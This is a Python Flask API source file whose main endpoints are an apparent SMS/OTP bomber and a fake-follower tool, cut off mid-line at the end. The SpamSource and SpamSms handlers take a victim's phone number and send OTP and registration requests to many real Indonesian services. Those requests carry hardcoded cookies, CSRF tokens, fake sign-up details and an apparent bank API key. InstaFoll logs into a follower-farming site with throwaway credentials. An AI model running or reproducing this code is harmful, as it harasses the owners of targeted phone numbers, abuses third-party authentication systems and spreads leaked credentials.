import re
from urllib import response
from flask import Flask,request
from flask_restful import Resource, Api
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy
from fake_useragent import UserAgent
import os,requests,json,random,string,time

app=Flask(__name__)
api=Api(app)

CORS(app)

db = SQLAlchemy(app)

basedir=os.path.dirname(os.path.abspath(__file__))
database="sqlite:///" + os.path.join(basedir,"db.sqlite")
app.config["SQLALCHEMY_DATABASE_URI"] = database

class ViewData(db.Model):
    id=db.Column(db.Integer,primary_key=True)
    nama=db.Column(db.String(100))
    umur=db.Column(db.Integer)
    token=db.Column(db.TEXT)

    def save(self):
        try:
            db.session.add(self)
            db.session.commit()
            return True
        except:
            return False

db.create_all()

identitas={}

class TestingSource(Resource):
    def get(self):
        #response={"msg":"Success Build Rest Api"}
        useragent=UserAgent()
        ua=useragent.random
        query=ViewData.query.all()
        output=[
            ({
                "id":data.id,
                "nama":data.nama,
                "umur":data.umur,
                "token":data.token
            }) 
            for data in query
        ]
        response=({
            "code" : 200,
            "mssg" : "Query data success",
            "data" : output
        })
        return response, 200

    def post(self):
        dataNama=request.form["nama"]
        dataUmur=request.form["umur"]
        dataToken=request.form["token"]

        model=ViewData(nama=dataNama,umur=dataUmur,token=dataToken)
        model.save()

        response=({
            "msg" : "Success add data",
            "code": 200
        })
        return response, 200
    def delete(self):
        query=ViewData.query.all()
        for data in query:
            db.session.delete(data)
            db.session.commit()

        response={
            "mssg": "Success delete all data",
            "reponse code": 200
        }

        return response, 200


class UpdateSource(Resource):
    def put(self,id):
        query=ViewData.query.get(id)
        editNama = request.form["nama"]
        editUmur=request.form["umur"]
        editToken=request.form["token"]

        query.nama = editNama
        query.umur = editUmur
        query.token = editToken

        response={
            "mssg": "Success Edit Data",
            "code": 200
        }

        return response

    def delete(self,id):
        queryData=ViewData.query.get(id)

        db.session.delete(queryData)
        db.session.commit()

        response={
            "mssg": "Success delete data",
            "code": 200
        }

        return response

class RandomUa(Resource):
    def get(self):
        useragent=UserAgent()
        ua=useragent.random
        return ua
        #return ({
            #"user-agent": ua,
            #"response code": 200,
            #"creator": "Ammar-Excuted"
        #})

class SpamSource(Resource):
    def post(self):
        nomor=request.form.get('nomor')
        if not nomor:
             return (
             {
                "mssg": "error",
                "respon": "masukkan nomor dengan benar.",
                "code": 404
             }
        )
        req=requests.post("https://auth.sampingan.co/v1/otp",data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor}),headers={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}).text
        p=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":nomor})).text
        pos=requests.post("https://api.myfave.com/api/fave/v3/auth",headers={'Host':'api.myfave.com','Connection':'keep-alive','Content-Length':'26','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-user-agent':'Fave-PWA/v1.0.0','content-type':'application/json','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Accept':'*/*','Origin':'https://myfave.com','Sec-Fetch-Site':'same-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://myfave.com/','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"phone":"+62"+nomor})).text
        AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
        head={    'authority': 'www.oto.com',    'accept': 'application/json, text/javascript, */*; q=0.01',    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',    'origin': 'https://www.oto.com',    'referer': 'https://www.oto.com/ovb/user-login',    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',    'sec-ch-ua-mobile': '?0',    'sec-ch-ua-platform': '"Linux"',    'sec-fetch-dest': 'empty',    'sec-fetch-mode': 'cors',    'sec-fetch-site': 'same-origin',    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',    'x-requested-with': 'XMLHttpRequest',}
        response = requests.post('https://www.oto.com/ovb/send-otp', params={    'lang': 'id',}, cookies={    'primary_utm_campaign': 'organic',    'primary_utm_medium': 'organic',    'primary_utm_source': 'yahoo',    'utm_campaign': 'organic',    'utm_medium': 'organic',    'utm_source': 'yahoo',    'landing_url': 'https%3A%2F%2Fwww.oto.com%2F',    '_csrf': 'aG2nJALlO7VyltTb-atrM-_EXaThOQri',    'GCLB': 'CPH61KyGt9yB2wE',    '_gcl_au': '1.1.60394401.1662191705',    '_pbjs_userid_consent_data': '3524755945110770',    'pbjs-pubCommonId': '0c3d7536-4c41-4e8c-8078-ede03a294dfe',    '_ga': 'GA1.2.1220515766.1662191705',    '_gid': 'GA1.2.525526430.1662191705',    '_gat': '1',    '_co_session_active': '1',    '_CO_anonymousId': '65ad5b8b-31fe-0728-c3ce-e208c717c122',    '_CO_type': 'connecto',    '_fbp': 'fb.1.1662191705704.1893770966',    '_dc_gtm_UA-58094033-8': '1',    '_lr_retry_request': 'true',    '_lr_env_src_ats': 'false',    '__gads': 'ID=0d3fa2b6107a5244:T=1662191707:S=ALNI_MbMDDAdViTY4nYB086vSjMp8axBUw',    '__gpi': 'UID=0000096baa896e74:T=1662191707:RT=1662191707:S=ALNI_MbpMPTZyUO8x5wnAh3T1Qq5rVKPDw',    'pubmatic-unifiedid': '%7B%22TDID%22%3A%22b8d808f8-e3d6-4b01-bfb5-34a077fe952a%22%2C%22TDID_LOOKUP%22%3A%22TRUE%22%2C%22TDID_CREATED_AT%22%3A%222022-08-03T07%3A55%3A08%22%7D',    'panoramaId_expiry': '1662796507670',    '_cc_id': 'a270b7341af8c173e8f2aa3f71b7accd',    'panoramaId': '3cc178a793a7f2c651c73fe7475c16d53938dce698845cc3fb7fea782d2fbcf3',    'pbjs_debug': '0',    'page_view': '1',    'cto_bidid': 'ilf0CV9KN1ZCRzExY1NYMXNqVmclMkJlZ3k4azlIem9NbHhaa1pXYWlCQlhmJTJCVjdCMGhwOUhkRWV4UTNoOFhMbjVLaXpUT2JiN24yNEhCOER6RDZuVFVpSWpYdVElM0QlM0Q',    'cto_bundle': 'yx0Sy185U09IckR1WW4waUNkSmpoY1VFMGdVa2dZSk1VdEYlMkY2bSUyQmhDSG0lMkJ2ZFRUR0FPaG5nTHFrY1ZiQ2IzSGtodmE5dWExeDVNdllUcW1tMXFmMnQ2WUQwZVc1dEREaGJjZ1ZhVzlDZmpzWlQzayUzRA',}, headers=head, data={    'mobile': nomor,    'bookingId': '0',    'businessUnit': 'mobil',})
        if "PENDING" in AmmarGanz:
             return (
             {
                "mssg": "success",
                "respon": "subscribe channel ammar executed.",
                "code": 200
             }
        )
        else:
             return (
             {
                "mssg": "limited code please wait 1 hours",
                "respon": "subscribe channel ammar executed",
                "code": 404
             }
        )

class InstaFoll(Resource):
    def post(self):
        ua=random.choice(['Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; sv-se) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36'])
        r = random.choice(string.ascii_letters)
        an = random.choice(string.ascii_letters)
        dom = random.choice(string.ascii_letters)
        #user = input("username akun tumbal\ninput> ")
        #passw = input("password akun tumbal\ninput> ")
        user = f"{dom}ammar-rifa_prikitiw{an}{r}"
        passw = f"co{dom}i{an}pyright{r}"
        headers = {
            'authority':'instagram.qlizz.com',
            'accept':'*/*',
            'accept-language':'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
            'content-type':'application/x-www-form-urlencoded; charset=UTF-8',
            # Requests sorts cookies= alphabetically
            # 'cookie': '_ga=GA1.2.684540350.1652173099; _gid=GA1.2.1932374052.1652173099; _gat_gtag_UA_137153197_1=1; __gads=ID=5a201913cb3adcd6-2285e36d20d300f8:T=1652173100:RT=1652173100:S=ALNI_Ma5T99MHBxaAI7ZNxZzKkvhw13pcg; XSRF-TOKEN=eyJpdiI6IitcL21FZlU1XC82WXBRQ1E0ZlNXY0lydz09IiwidmFsdWUiOiJYTm82MGFXQWhHZ1UxQmZZZXI3VTdaQ0syalRhZ3ZEcFVUenI5TmVpTTl6VWMyZHpmNWtFZFlWWWhXVGN2SVlMdFZBR2UwRmcwYnRHeDJhaWxqK045QT09IiwibWFjIjoiZWM1ZjRjMTBlNDQ0NGU3NjgzN2FmMDA1ZTg5NjJiMjBmNTlmMjQ0MDFlNTBlODIxMTkwNGVjYTY5NTk1YTlhMSJ9; laravel_session=eyJpdiI6InNUXC9HUDlQUXdcL3lBdmFQTktWNWJVQT09IiwidmFsdWUiOiI1VEx5T29GR04zZVwvOUlzUVR1T3ZVbG5iK1FQWXcxYlR4ZHhwNkpoK2hzSXRPcEN1c1o3ZWk0SUVKcHpjcGd4bXRnSWVReU1qUURCcG8wUVd1ejA4VGc9PSIsIm1hYyI6ImZkOGNiNmVmNDBkYTFkN2Q4MmY1YmQ1NDFkYTEzMmE5ZWUwNWNmNWQ3NWU2MmU4ODVlZWI5MThmMmVhYjg4M2IifQ%3D%3D',
            'origin':'https://instagram.qlizz.com',
            'referer':'https://instagram.qlizz.com/autofollowers',
            'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
            'sec-ch-ua-mobile':'?0',
            'sec-ch-ua-platform':'"Windows"',
            'sec-fetch-dest':'empty',
            'sec-fetch-mode':'cors',
            'sec-fetch-site':'same-origin',
            'user-agent':ua,
            #'user-agent':'Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
            'x-requested-with':'XMLHttpRequest',
        }
        Username = request.form.get('username')
        bruh = {
            'username': user,
            'password': passw,
        }
        s = requests.Session()
        s.post('https://instagram.qlizz.com/login', data=bruh)
        alok = s.get('https://instagram.qlizz.com/autofollowers').text
        #print (alok)
        a = alok.split('name="_token" value="')[1];
        tok = a.split('"')[0];
        data = {
            '_token': tok,
            'link': Username,
            'tool': 'autofollowers',
        }
        response = s.post('https://instagram.qlizz.com/send', headers=headers, data=data).text
        if "Your post is successfully added for free 10 followers. You will get followers in within 1 hour." in response:
            return (
            {
                "success": True,
                "response": "Success Add 10 followers to ypur account",
                "creator": "Ammar-Executed"
            }
        )
        else:
            return (
            {
                "success": False,
                "response": "Please Wait 1 hours to reapeat tools",
                "creator": "Ammar-Executed"
            }
        )

class SpamSms(Resource):
    def post(self):
        a = random.choice(string.ascii_letters)
        b = random.choice(string.ascii_letters)
        c = random.choice(string.ascii_letters)
        d = random.choice(string.ascii_letters)
        e = random.choice(string.ascii_letters)
        f = random.choice(string.ascii_letters)
        g = random.choice(string.ascii_letters)
        h = random.choice(string.ascii_letters)
        i = random.choice(string.ascii_letters)
        j = random.choice(string.ascii_letters)
        k = random.choice(string.ascii_letters)
        l = random.choice(string.ascii_letters)
        m = random.choice(string.ascii_letters)
        n = random.choice(string.ascii_letters)
        o = random.choice(string.ascii_letters)
        p = random.choice(string.ascii_letters)
        q = random.choice(string.ascii_letters)
        r = random.choice(string.ascii_letters)
        s = random.choice(string.ascii_letters)
        t = random.choice(string.ascii_letters)
        u = random.choice(string.ascii_letters)
        v = random.choice(string.ascii_letters)
        w = random.choice(string.ascii_letters)
        x = random.choice(string.ascii_letters)
        y = random.choice(string.ascii_letters)
        z = random.choice(string.ascii_letters)
        aa = random.choice(string.ascii_letters)
        ba = random.choice(string.ascii_letters)
        ca = random.choice(string.ascii_letters)
        da = random.choice(string.ascii_letters)
        ea = random.choice(string.ascii_letters)
        fa = random.choice(string.ascii_letters)
        ga = random.choice(string.ascii_letters)
        ha = random.choice(string.ascii_letters)
        ia = random.choice(string.ascii_letters)
        ja = random.choice(string.ascii_letters)
        ka = random.choice(string.ascii_letters)
        la = random.choice(string.ascii_letters)
        ma = random.choice(string.ascii_letters)
        na = random.choice(string.ascii_letters)
        oa = random.choice(string.ascii_letters)
        dom=f"{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}{m}{n}{o}{p}{q}{r}{s}{t}{u}{v}{w}{x}{y}{z}{aa}{ba}{ca}{da}{ea}{fa}{ga}{ha}{ia}{ja}{ka}{la}{ma}{na}{oa}"
        nomor=request.form.get('nomor')
        AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
        map=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":nomor})).text
        dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms"})).text
        jenius=requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nomor,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}).text
        req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+nomor}})).text
        pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})).text
        bli=requests.post("https://www.blibli.com/backend/common/users/_request-otp",headers={"Host":"www.blibli.com","content-length":"27","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.blibli.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.blibli.com/login?ref=&logonId=0"+nomor,"accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":"0"+nomor})).text
        ha=requests.post("https://pluang.com/api/user/register/send-otp",headers={'Host':'pluang.com','content-length':'112','sec-ch-ua':'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'Android','content-type':'application/json','accept':'*/*','origin':'https://pluang.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pluang.com/register','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},cookies={"cookie":"_gcl_au=1.1.634793654.1661960345","cookie":"_ga=GA1.2.217955334.1661960346","cookie":"_gid=GA1.2.1904059940.1661960346","cookie":"_gat_gtag_UA_124743364_3=1","cookie":"_fbp=fb.1.1661960347395.1573571703","cookie":"environment=production","cookie":"language=in","cookie":"WZRK_G=abf62dd1bf5f41edaa930f04872d1884","cookie":"cebs=1","cookie":"_tt_enable_cookie=1","cookie":"_ttp=ef83fe23-1e62-4741-9339-c077fd6d2076","cookie":"WZRK_S_R57-4Z9-9W6Z=%7B%22p%22%3A1%2C%22s%22%3A1661960351%2C%22t%22%3A1661960350%7D","cookie":"cebsp=1","cookie":"_ce.s=v~2dbcd906fa5fb9b378ebbd2642a150297d12fd70~vpv~0~v11slnt~1661960352042","cookie":"_ga_3RX02MCRS0=GS1.1.1661960345.1.1.1661960362.43.0.0","cookie":"_ga_824G2HJWD9=GS1.1.1661960346.1.1.1661960362.0.0.0","cookie":"_ga_EHTZ6P30C7=GS1.1.1661960346.1.1.1661960362.0.0.0","cookie":"_ga_ZXS1PKZ40M=GS1.1.1661960346.1.1.1661960362.0.0.0"},data=json.dumps({"name":"Shshshiskabzbz","email":"ammarexecuted@gmail.com","phone":"0"+nomor,"csrfToken":"pluangCsrfToken"})).text
        pos=requests.post("https://www.carsome.id/website/login/sendSMS",headers={"Host":"www.carsome.id","content-length":"38","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","country":"ID","x-amplitude-device-id":"s6abXpSHh6_mTsxfvOynJM","sec-ch-ua-platform":"Android","origin":"https://www.carsome.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.carsome.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":nomor,"optType":0})).text
        req=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor})).text
        head={    'authority': 'www.oto.com',    'accept': 'application/json, text/javascript, */*; q=0.01',    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',    'origin': 'https://www.oto.com',    'referer': 'https://www.oto.com/ovb/user-login',    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',    'sec-ch-ua-mobile': '?0',    'sec-ch-ua-platform': '"Linux"',    'sec-fetch-dest': 'empty',    'sec-fetch-mode': 'cors',    'sec-fetch-site': 'same-origin',    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',    'x-requested-with': 'XMLHttpRequest',}
        response = requests.post('https://www.oto.com/ovb/send-otp', params={    'lang': 'id',}, cookies={    'primary_utm_campaign': 'organic',    'primary_utm_medium': 'organic',    'primary_utm_source': 'yahoo',    'utm_campaign': 'organic',    'utm_medium': 'organic',    'utm_source': 'yahoo',    'landing_url': 'https%3A%2F%2Fwww.oto.com%2F',    '_csrf': 'aG2nJALlO7VyltTb-atrM-_EXaThOQri',    'GCLB': 'CPH61KyGt9yB2wE',    '_gcl_au': '1.1.60394401.1662191705',    '_pbjs_userid_consent_data': '3524755945110770',    'pbjs-pubCommonId': '0c3d7536-4c41-4e8c-8078-ede03a294dfe',    '_ga': 'GA1.2.1220515766.1662191705',    '_gid': 'GA1.2.525526430.1662191705',    '_gat': '1',    '_co_session_active': '1',    '_CO_anonymousId': '65ad5b8b-31fe-0728-c3ce-e208c717c122',    '_CO_type': 'connecto',    '_fbp': 'fb.1.1662191705704.1893770966',    '_dc_gtm_UA-58094033-8': '1',    '_lr_retry_request': 'true',    '_lr_env_src_ats': 'false',    '__gads': 'ID=0d3fa2b6107a5244:T=1662191707:S=ALNI_MbMDDAdViTY4nYB086vSjMp8axBUw',    '__gpi': 'UID=0000096baa896e74:T=1662191707:RT=1662191707:S=ALNI_MbpMPTZyUO8x5wnAh3T1Qq5rVKPDw',    'pubmatic-unifiedid': '%7B%22TDID%22%3A%22b8d808f8-e3d6-4b01-bfb5-34a077fe952a%22%2C%22TDID_LOOKUP%22%3A%22TRUE%22%2C%22TDID_CREATED_AT%22%3A%222022-08-03T07%3A55%3A08%22%7D',    'panoramaId_expiry': '1662796507670',    '_cc_id': 'a270b7341af8c173e8f2aa3f71b7accd',    'panoramaId': '3cc178a793a7f2c651c73fe7475c16d53938dce698845cc3fb7fea782d2fbcf3',    'pbjs_debug': '0',    'page_view': '1',    'cto_bidid': 'ilf0CV9KN1ZCRzExY1NYMXNqVmclMkJlZ3k4azlIem9NbHhaa1pXYWlCQlhmJTJCVjdCMGhwOUhkRWV4UTNoOFhMbjVLaXpUT2JiN24yNEhCOER6RDZuVFVpSWpYdVElM0QlM0Q',    'cto_bundle': 'yx0Sy185U09IckR1WW4waUNkSmpoY1VFMGdVa2dZSk1VdEYlMkY2bSUyQmhDSG0lMkJ2ZFRUR0FPaG5nTHFrY1ZiQ2IzSGtodmE5dWExeDVNdllUcW1tMXFmMnQ2WUQwZVc1dEREaGJjZ1ZhVzlDZmpzWlQzayUzRA',}, headers=head, data={    'mobile': nomor,    'bookingId': '0',    'businessUnit': 'mobil',})
        singsing=requests.post("https://api.momobil.id/users/otp/send",headers={"Host":"api.momobil.id","Connection":"keep-alive","Content-Length":"39","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Content-Type":"application/json","Accept":"*/*","Origin":"https://momobil.id","Sec-Fetch-Site":"same-site","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://momobil.id/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"to":"0"+nomor,"type":"register"})).text
        posting=requests.post("https://api.qoala.app/api/registrations",headers={"Host":"api.qoala.app","content-length":"202","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.qoala.app","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.qoala.app/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"fullName":"Hsjsnsns","email":"ammarexecuted@gmail.com","phoneNumber":"+62"+nomor,"identityType":"KTP","nationality":"ID","password":"Abc167@ggwp","passwordConfirmation":"Abc167@ggwp","lang":"id"})).text
        last=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"sms","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
        ammar_gamteng=requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={'Host':'www.sayurbox.com','content-length':'284','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", 